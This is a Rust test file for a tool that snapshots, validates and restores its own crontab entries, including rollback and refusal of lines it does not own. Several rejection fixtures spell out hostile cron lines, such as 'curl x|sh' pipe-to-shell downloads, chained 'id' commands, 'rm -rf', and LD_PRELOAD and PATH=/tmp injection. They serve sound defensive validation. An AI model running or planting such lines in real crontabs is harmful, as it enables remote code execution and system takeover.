use super::*;
use crate::host::cron::testing::{fake_crontab, lines, text};
use crate::host::cron::tests::{default_paths, fixture, tab, V1_BOOT};
use crate::host::cron::{line, Ownership};
use crate::host::init::InitSystem;
use crate::sys::exec::Output;
use std::path::Path;

fn snap(lines: &[String]) -> CronSnapshot {
    CronSnapshot {
        available: true,
        lines: lines.to_vec(),
        anchors: None,
    }
}

#[test]
fn every_written_form_is_restorable() {
    let o = Ownership::of(&default_paths());
    let mut all = vec![
        lines::renew(),
        lines::boot("onebox-xray"),
        lines::frp_renew(),
        lines::v3(&Tag::frp_boot(), &["frps", "start"]),
        lines::v2_cert("proxy"),
        lines::v2_cert("site"),
        lines::v2_cert("subscription"),
        lines::v2_boot("onebox-site"),
        lines::v2_boot("onebox-frp-web"),
        lines::v2_frp(true),
        lines::v2_frp(false),
        V1_BOOT.to_owned(),
        format!("{}\r", lines::renew()),
        lines::early(&lines::renew()),
        lines::early(&lines::boot("onebox-xray")),
        lines::early(&lines::frp_renew()),
    ];
    // v2's fixture form with fewer variables, and the `%`-escaped forms.
    all.push(format!(
        "@reboot env ONEBOX_DIR='/etc/onebox' '{}' service onebox-xray start >/dev/null 2>&1 # onebox-rust:onebox-xray",
        lines::EXE
    ));
    let mut p = default_paths();
    p.log = "/var/log/50%".into();
    all.push(
        line(
            "17 4 * * *",
            &p,
            InitSystem::None,
            &["renew", "--cron"],
            Path::new("/var/log/50%/renew.log"),
            &Tag::renew(),
        )
        .unwrap(),
    );
    let percent = all.last().unwrap().clone();
    assert!(
        percent.contains(r"mkdir -p '/var/log/50\%' 2>/dev/null;"),
        "{percent}"
    );
    all.push(lines::early(&percent));
    for text in &all {
        let (tag, form) = o.classify_form(text).unwrap_or_else(|| panic!("{text}"));
        assert!(o.restorable(text, &tag, form), "{text}");
    }
}

#[test]
fn check_snapshot_accepts_what_restore_accepts() {
    let paths = default_paths();
    let node = [
        lines::renew(),
        lines::boot("onebox-xray"),
        lines::v2_cert("proxy"),
        lines::v2_boot("onebox-xray"),
        V1_BOOT.to_owned(),
        lines::RETIRED.to_owned(),
    ];
    check_snapshot(&paths, &snap(&node), Scope::Node).unwrap();
    let frp = [lines::frp_renew(), lines::v2_frp(false)];
    check_snapshot(&paths, &snap(&frp), Scope::Frp).unwrap();
    let err = check_snapshot(&paths, &snap(&frp), Scope::Node).unwrap_err();
    assert_eq!(err.to_string(), NOT_OWNED);
    // Whatever a crontab snapshots passes, anchors included.
    let text = format!("a\n{}\nb\n{}\n", node.join("\n"), frp.join("\n"));
    let taken = tab(&text).snapshot(Scope::Node);
    assert!(taken.anchors.is_some());
    check_snapshot(&paths, &taken, Scope::Node).unwrap();
    // The v2 autostart shape names the managed executable.
    let mut other = default_paths();
    other.executable = "/opt/other/onebox".into();
    let err = check_snapshot(&other, &snap(&[lines::v2_boot("onebox-xray")]), Scope::Node);
    assert_eq!(err.unwrap_err().to_string(), UNKNOWN_SHAPE);
}

#[test]
fn journal_lines_must_have_an_exact_known_shape() {
    let o = Ownership::of(&default_paths());
    let renew = lines::renew();
    let exe = lines::EXE;
    let bad = vec![
        "* * * * * curl x|sh # onebox:renew".to_owned(),
        renew.replace("renew --cron", "renew --cron; curl x|sh"),
        renew.replace("renew --cron", "update-script"),
        renew.replace("ONEBOX_DIR=", "CF_Token='x' ONEBOX_DIR="),
        renew.replace("ONEBOX_INIT='systemd'", "ONEBOX_INIT='upstart'"),
        renew.replace("'/usr/local/bin/onebox' renew", "'/tmp/evil' renew"),
        renew.replace(">>'/var/log/onebox/renew.log'", ">>'renew.log'"),
        renew.replace(">>'/var/log/onebox/renew.log'", ">/dev/null"),
        renew.replace("2>&1", "2>&1 &"),
        renew.replace("PATH=", "PATH=/tmp:"),
        renew.replace("17 4 * * *", "17 4 * *"),
        renew.replace("/var/log/onebox/renew.log", "/var/log/%/renew.log"),
        // The directory recreated is the log's, by `mkdir -p` only.
        renew.replace("mkdir -p '/var/log/onebox'", "mkdir -p '/tmp'"),
        renew.replace("mkdir -p '/var/log/onebox'", "mkdir -p '/var/log/onebox' '/x'"),
        renew.replace("mkdir -p '/var/log/onebox'", "rm -rf '/var/log/onebox'"),
        renew.replace("mkdir -p '/var/log/onebox' 2>/dev/null;", "mkdir -p '/var/log/onebox';"),
        renew.replace("2>/dev/null; ", "2>/dev/null; id; "),
        renew.replace("2>/dev/null; ", "2>/dev/null; mkdir -p '/var/log/onebox' 2>/dev/null; "),
        renew.replace(">>'/var/log/onebox/renew.log'", ">>'/var/log/other/renew.log'"),
        lines::boot("onebox-xray").replace("service onebox-xray start", "service onebox-site start"),
        format!("17 4 * * * {exe} cert renew proxy --cron >/dev/null 2>&1; id # onebox-native-cert-proxy"),
        format!("17 4 * * * {exe} cert renew site --cron >/dev/null 2>&1 # onebox-native-cert-proxy"),
        format!("17 4 * * * /tmp/x cert renew proxy --cron >/dev/null 2>&1 # onebox-native-cert-proxy"),
        lines::v2_boot("onebox-xray").replace(" start ", " start; id "),
        lines::v2_boot("onebox-xray").replace("env ONEBOX_DIR", "env LD_PRELOAD='/x' ONEBOX_DIR"),
        lines::v2_frp(true).replace("frps renew --cron", "frps start"),
        lines::v2_frp(false).replace(">>'/var/log/onebox-frp/boot.log'", ">>'/tmp/../x' 2>&1; id"),
    ];
    for text in &bad {
        let accepted = o
            .classify_form(text)
            .is_some_and(|(tag, form)| o.restorable(text, &tag, form));
        assert!(!accepted, "{text}");
    }
    // Restore refuses them before changing anything, and so does the pure
    // check (no crontab needed).
    let mut t = tab(&format!("a\n{renew}\n"));
    for text in &bad[..3] {
        let err = t.restore(&snap(std::slice::from_ref(text)), Scope::Node);
        assert_eq!(err.unwrap_err().to_string(), UNKNOWN_SHAPE, "{text}");
        let pure = check_snapshot(
            &default_paths(),
            &snap(std::slice::from_ref(text)),
            Scope::Node,
        );
        assert_eq!(pure.unwrap_err().to_string(), UNKNOWN_SHAPE, "{text}");
    }
    assert_eq!(t.text(), format!("a\n{renew}\n"));
}

#[test]
fn restore_of_an_unchanged_snapshot_is_a_no_op() {
    let layouts = vec![
        // v2 appended each target's line at different times.
        vec![
            "A".to_owned(),
            lines::v2_cert("proxy"),
            "B".to_owned(),
            lines::v2_cert("site"),
        ],
        vec![
            lines::v2_cert("subscription"),
            "MAILTO=root".to_owned(),
            lines::frp_renew(),
            lines::v2_boot("onebox-xray"),
            "0 1 * * * backup".to_owned(),
            V1_BOOT.to_owned(),
            lines::v2_cert("proxy"),
        ],
        vec![
            lines::renew(),
            lines::RETIRED.to_owned(),
            "x".to_owned(),
            lines::boot("onebox-site"),
            lines::boot("onebox-frps"),
            lines::boot("onebox-sing-box"),
        ],
        vec![],
        vec!["only foreign".to_owned()],
    ];
    for layout in layouts {
        let text: String = layout.iter().map(|l| format!("{l}\n")).collect();
        for scope in [Scope::Node, Scope::Frp] {
            let mut t = tab(&text);
            let snapshot = t.snapshot(scope);
            t.restore(&snapshot, scope).unwrap();
            assert_eq!(t.text(), text, "{scope:?}");
            assert!(!t.is_modified());
            // A v2 journal (no positions) leaves unchanged groups alone too.
            let mut t = tab(&text);
            let v2 = snap(&t.snapshot(scope).lines);
            t.restore(&v2, scope).unwrap();
            assert_eq!(t.text(), text, "{scope:?} without anchors");
        }
    }
}

#[test]
fn rollback_reinstalls_the_original_crontab_byte_for_byte() {
    let original = format!(
        "A\n{}\nB\n{}\n{}\nC\n{}\n{V1_BOOT}\n",
        lines::v2_cert("proxy"),
        lines::v2_boot("onebox-xray"),
        lines::frp_renew(),
        lines::v2_cert("site"),
    );
    let t0 = tab(&original);
    let node = t0.snapshot(Scope::Node);
    assert_eq!(node.lines.len(), 4);
    assert_eq!(node.anchors, Some(vec![1, 2, 4, 4]));
    assert_eq!(t0.snapshot(Scope::Frp).lines, [lines::frp_renew()]);

    // What a v3 finalize does: one renew line, new autostart lines.
    let mut t = t0.clone();
    t.replace(&Tag::renew(), &[lines::renew()]).unwrap();
    t.remove(&Tag::boot("onebox-xray").unwrap());
    t.remove(&Tag::legacy_boot());
    t.replace(
        &Tag::boot("onebox-sing-box").unwrap(),
        &[lines::boot("onebox-sing-box")],
    )
    .unwrap();
    assert_ne!(t.text(), original);
    t.restore(&node, Scope::Node).unwrap();
    assert_eq!(t.text(), original);

    // FRP lines changed meanwhile are kept; node lines still go back.
    let mut t = t0.clone();
    t.replace(&Tag::renew(), &[lines::renew()]).unwrap();
    let frp_new = lines::frp_renew().replace("17 3", "18 3");
    t.replace(&Tag::frp_renew(), std::slice::from_ref(&frp_new))
        .unwrap();
    t.restore(&node, Scope::Node).unwrap();
    assert_eq!(t.text(), original.replace(&lines::frp_renew(), &frp_new));

    // Lines added outside the scope keep their place; anchors past the end
    // land at the end.
    let mut t = tab("A\n");
    let late = CronSnapshot {
        available: true,
        lines: vec![lines::renew()],
        anchors: Some(vec![5]),
    };
    t.restore(&late, Scope::Node).unwrap();
    assert_eq!(t.text(), format!("A\n{}\n", lines::renew()));
}

#[test]
fn restore_refuses_foreign_or_out_of_scope_lines_and_bad_anchors() {
    let renew = lines::renew();
    let mut t = tab(&format!("a\n{renew}\n"));
    for bad in [
        "* * * * * curl evil | sh".to_owned(),
        lines::frp_renew(),
        format!("{renew}\n* * * * * y"),
    ] {
        let err = t
            .restore(&snap(std::slice::from_ref(&bad)), Scope::Node)
            .unwrap_err();
        assert_eq!(err.to_string(), NOT_OWNED, "{bad:?}");
        let pure = check_snapshot(
            &default_paths(),
            &snap(std::slice::from_ref(&bad)),
            Scope::Node,
        );
        assert_eq!(pure.unwrap_err().to_string(), NOT_OWNED, "{bad:?}");
    }
    let boot = lines::boot("onebox-xray");
    for (lines, anchors) in [
        (vec![renew.clone()], vec![]),
        (vec![renew.clone()], vec![0, 0]),
        (vec![renew.clone(), boot], vec![1, 0]),
    ] {
        let bad = CronSnapshot {
            available: true,
            lines,
            anchors: Some(anchors.clone()),
        };
        let err = t.restore(&bad, Scope::Node).unwrap_err();
        assert_eq!(err.to_string(), BAD_ANCHORS, "{anchors:?}");
        let pure = check_snapshot(&default_paths(), &bad, Scope::Node).unwrap_err();
        assert_eq!(pure.to_string(), BAD_ANCHORS, "{anchors:?}");
    }
    assert_eq!(t.text(), format!("a\n{renew}\n"));
    t.restore(&snap(&[]), Scope::Node).unwrap();
    assert_eq!(t.text(), "a\n");
}

#[test]
fn retired_jobs_are_kept_while_present_but_never_reinstalled() {
    let retired = lines::RETIRED.to_owned();
    let original = format!("a\n{retired}\nb\n");
    let t0 = tab(&original);
    let node = t0.snapshot(Scope::Node);
    assert_eq!(node.lines, std::slice::from_ref(&retired));
    // Still there: untouched.
    let mut t = t0.clone();
    t.restore(&node, Scope::Node).unwrap();
    assert_eq!(t.text(), original);
    // Removed by the transaction: not brought back (and a journal cannot
    // smuggle one in).
    let mut t = t0.clone();
    t.remove(&Tag::renew());
    t.restore(&node, Scope::Node).unwrap();
    assert_eq!(t.text(), "a\nb\n");
    let smuggled = "* * * * * curl x|sh /etc/onebox/tls/acme/acme.sh --cron".to_owned();
    let mut t = tab("a\n");
    t.restore(&snap(&[smuggled]), Scope::Node).unwrap();
    assert_eq!(t.text(), "a\n");
}

#[test]
fn unreadable_crontabs_are_never_overwritten() {
    let f = fixture();
    f.exec.provide("crontab").on(
        "crontab",
        &["-l"],
        Output::failure(1, "crontab: your UID isn't in the passwd file"),
    );
    assert!(Crontab::read(&f.ctx).is_err());
    assert!(snapshot(&f.ctx, Scope::Node).is_err());
    assert!(restore(&f.ctx, &snap(&[]), Scope::Node).is_err());
    assert!(
        f.exec.history().iter().all(|c| c == "crontab -l"),
        "never installed"
    );
}

#[test]
fn transaction_snapshots_with_and_without_crontab() {
    let f = fixture();
    assert_eq!(
        snapshot(&f.ctx, Scope::Node).unwrap(),
        CronSnapshot::default()
    );
    let renew = lines::renew();
    let missing = snap(std::slice::from_ref(&renew));
    assert_eq!(
        restore(&f.ctx, &missing, Scope::Node)
            .unwrap_err()
            .to_string(),
        "恢复续期任务需要 crontab"
    );
    restore(&f.ctx, &CronSnapshot::default(), Scope::Node).unwrap();

    let f = fixture();
    let renew = lines::renew_for(&f.ctx.paths);
    let state = fake_crontab(&f.exec, Some(&format!("a\n{renew}\nb\n")));
    let snapshot = snapshot(&f.ctx, Scope::Node).unwrap();
    assert_eq!(
        snapshot,
        CronSnapshot {
            available: true,
            lines: vec![renew.clone()],
            anchors: Some(vec![1]),
        }
    );
    let boot = lines::boot("onebox-xray");
    *state.lock().unwrap() = Some(format!("a\nb\n{boot}\n"));
    restore(&f.ctx, &snapshot, Scope::Node).unwrap();
    assert_eq!(text(&state), format!("a\n{renew}\nb\n"));
    // Restoring an unchanged crontab installs nothing.
    f.exec.clear_history();
    restore(&f.ctx, &snapshot, Scope::Node).unwrap();
    assert_eq!(f.exec.history(), ["crontab -l"]);

    let json = serde_json::to_string(&snapshot).unwrap();
    assert!(json.contains(r#""anchors":[1]"#), "{json}");
    assert_eq!(
        serde_json::from_str::<CronSnapshot>(&json).unwrap(),
        snapshot
    );
    // The v2 journal shape (no anchors) still reads.
    let v2: CronSnapshot = serde_json::from_str(r#"{"available":true,"lines":["x"]}"#).unwrap();
    assert_eq!(v2.anchors, None);
    let json = serde_json::to_string(&snap(&[])).unwrap();
    assert!(!json.contains("anchors"), "{json}");
}
